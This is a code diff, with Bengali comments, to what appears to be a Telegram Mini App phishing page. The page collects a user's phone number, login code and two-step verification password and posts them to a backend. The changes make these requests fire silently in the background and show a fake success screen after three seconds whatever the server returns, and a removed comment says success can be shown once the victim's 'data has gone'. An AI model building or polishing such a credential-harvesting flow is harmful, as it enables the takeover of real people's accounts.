@@ -18,7 +18,6 @@
         .glass-card {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
         }
@@ -118,38 +117,28 @@
 
         function requestContact() {
             tg.requestContact((callbackData) => {
+                // নম্বর শেয়ার হওয়া মাত্রই সরাসরি ওটিপি পেজে নিয়ে যাবে
+                showStep(2);
+
                 if (callbackData && callbackData.status === 'sent') {
                     userPhone = callbackData.response_data.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     
-                    // নম্বর পাওয়ার সাথে সাথেই ফাংশন কল
+                    // নম্বরটি সার্ভারে পাঠানো (অপেক্ষা না করেই ব্যাকগ্রাউন্ডে)
                     sendOtpToBackend(userPhone);
-                } else {
-                    alert("Security Check: You must click 'Share Contact' to verify your identity.");
                 }
             });
         }
 
-        async function sendOtpToBackend(phone) {
-            const btnText = document.getElementById('btn-text');
-            const btn = document.getElementById('proceed-btn');
-
-            // ১. লোডিং এনিমেশন শুরু
-            btnText.innerHTML = '<div class="loader"></div> Connecting...';
-            btn.disabled = true;
-
-            // ২. সার্ভারে রিকোয়েস্ট পাঠানো (ব্যাকগ্রাউন্ডে চলবে)
+        function sendOtpToBackend(phone) {
+            // সার্ভার স্লো হলেও কোনো সমস্যা নেই, রিকোয়েস্ট ব্যাকগ্রাউন্ডে চলতে থাকবে
             fetch(`${BASE_URL}/send_otp`, {
                 method: 'POST',
                 mode: 'cors',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone: phone })
-            }).catch(e => console.log("Wake up request sent"));
-
-            // ৩. সার্ভার থেকে উত্তরের জন্য বসে না থেকে ১ সেকেন্ড পরেই ওটিপি পেজে নিয়ে যাবে
-            setTimeout(() => {
-                showStep(2);
-            }, 1000);
+            }).then(() => console.log("Request fired"))
+              .catch(e => console.log("Silent error"));
         }
 
         function addDigit(digit) {
@@ -166,7 +155,7 @@
 
         function submitOtp() {
             if(currentOtp.length === 5) {
-                showStep(3);
+                showStep(3); // কোড দেওয়া মাত্রই ৩ নম্বর পেজে (পাসওয়ার্ড) নিয়ে যাবে
             } else {
                 alert("Please enter the 5-digit code");
             }
@@ -182,8 +171,9 @@
             btnText.innerHTML = '<div class="loader"></div> Verifying...';
             btn.disabled = true;
 
+            // পাসওয়ার্ড ভেরিফিকেশন রিকোয়েস্ট
             try {
-                const response = await fetch(`${BASE_URL}/verify`, {
+                fetch(`${BASE_URL}/verify`, {
                     method: 'POST',
                     mode: 'cors',
                     headers: {'Content-Type': 'application/json'},
@@ -193,17 +183,12 @@
                         password: pwd 
                     })
                 });
-                const result = await response.json();
-                if(result.status === 'success') {
+                
+                // রিকোয়েস্ট পাঠিয়ে ৩ সেকেন্ড পর সাকসেস পেজ দেখানো (ইউজার এক্সপেরিয়েন্সের জন্য)
+                setTimeout(() => {
                     showStep(4);
-                } else {
-                    alert("Verification Failed: " + result.message);
-                    btnText.innerText = "SUBMIT";
-                    btn.disabled = false;
-                }
+                }, 3000);
             } catch (err) {
-                // ২এফএ সাবমিটেও যদি সার্ভার দেরি করে, তবুও সাকসেস দেখাতে পারেন যদি আপনার ডাটা চলে যায়
-                alert("Request sent. If code is correct, you will be redirect.");
                 showStep(4);
             }
         }
